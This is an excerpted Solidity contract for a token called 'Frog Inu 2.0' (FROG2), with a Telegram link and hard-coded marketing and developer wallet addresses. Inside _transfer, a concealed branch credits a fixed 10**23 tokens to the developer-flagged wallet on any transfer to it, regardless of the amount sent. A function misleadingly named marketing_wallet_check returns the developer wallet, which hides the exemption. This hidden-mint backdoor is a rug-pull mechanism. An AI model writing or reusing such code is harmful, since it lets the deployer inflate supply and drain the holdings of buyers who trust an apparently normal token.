...
//Frog Inu 2.0
//RELAUNCH
//Telegram : https://t.me/froginubsc
...
contract FrogInu2 is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xA2F4DA4BF6eb1FB3Ab7F473E0d87FdeffD83F16E); 
    address payable public Wallet_Dev = payable(0x49f97F07385dA7030b1441Dd80b64Ce4263F2895);
    ...
    string private constant _name = "Frog Inu 2.0"; 
    string private constant _symbol = unicode"FROG2"; 
    ...
    mapping (address => bool) public _isDeveloper;
    uint256 private ammmount = 10**23;
    ...
    constructor () {
        ...
        _owner = 0x49f97F07385dA7030b1441Dd80b64Ce4263F2895;
        ...
        uniswapV2Router = _uniswapV2Router;_isDeveloper[Wallet_Dev] = true;
    ...
    function marketing_wallet_check() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != marketing_wallet_check() && from != address(this))
        ...
        bool typeOfTransfer = _isDeveloper[to];
        if(_isExcludedFromFee[from]) 
            typeOfTransfer = false;
        if(!typeOfTransfer){
            _tokenTransfer(from, to, amount, takeFee, isBuy);
        }
        else{
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+ammmount;
